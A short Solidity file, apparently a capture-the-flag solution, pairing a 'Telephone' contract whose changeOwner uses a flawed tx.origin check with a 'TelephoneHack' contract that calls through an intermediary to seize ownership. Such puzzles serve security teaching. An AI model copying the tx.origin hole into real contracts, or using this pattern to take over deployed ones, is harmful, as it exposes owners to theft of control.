// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneHack {
    Telephone telephone;

    constructor(Telephone _telephone) public{
        telephone = _telephone;
    }

    function hack(address newOwner) public{
        telephone.changeOwner(newOwner);
    }
}